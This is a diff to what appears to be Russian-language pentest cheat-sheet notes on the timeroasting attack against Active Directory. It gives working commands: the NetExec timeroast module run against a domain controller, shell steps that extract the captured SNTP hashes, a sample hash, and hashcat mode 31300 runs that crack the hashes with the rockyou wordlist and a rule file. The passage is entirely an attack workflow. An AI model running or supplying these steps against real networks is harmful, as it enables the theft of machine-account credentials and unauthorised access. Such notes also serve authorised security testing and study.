@@ -56,11 +56,13 @@ timeroasting
 nxc smb DC_ip -M timeroast 
 вставляем  реузльтат команды в  hashes.txt
 cat hashes.txt | awk '{print $5}' >  timeroast_hashes.txt
-пример хэща 
-1000:$sntp-ms$f867f5b9aacd16ecde5a234b42d131251$1c0111e900000000000a39b64c4f434cede4c97ada015138e1b8428bffbfcd0aede51590c6096935ede51590c60981234
+cut -d':' -f2- timeroast_hashes.txt > clean_hashes.txt
 
-hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule  --username
-hashcat -m 31300 -a 0 timeroast_hashes.txt  --username --show 
+пример хэша 
+$sntp-ms$8952c9dd3ad8418cfb1d827b15c60d18$1c0211e900000014000a1ae20a010001ee26b2276bd05949e1b8428bffbfcd0aee26b263d3bf9907ee26b263d3c01a36
+
+hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule 
+hashcat -m 31300 -a 0 timeroast_hashes.txt --show 
 
 
 
